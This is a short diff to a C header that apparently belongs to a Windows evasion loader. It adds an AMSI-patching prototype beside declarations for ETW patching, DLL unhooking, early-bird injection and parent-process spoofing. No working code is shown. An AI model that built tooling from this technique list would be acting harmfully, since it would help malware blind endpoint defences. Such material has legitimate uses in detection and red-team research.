@@ -11,6 +11,7 @@ BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection);
 int FindTarget();
 void perunfart(HANDLE hSusProc);
 void etwPatch();
+void amsiPatch();
 void earlybird(PROCESS_INFORMATION pi);
 PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six);
 //HANDLE FindThread(int pid);
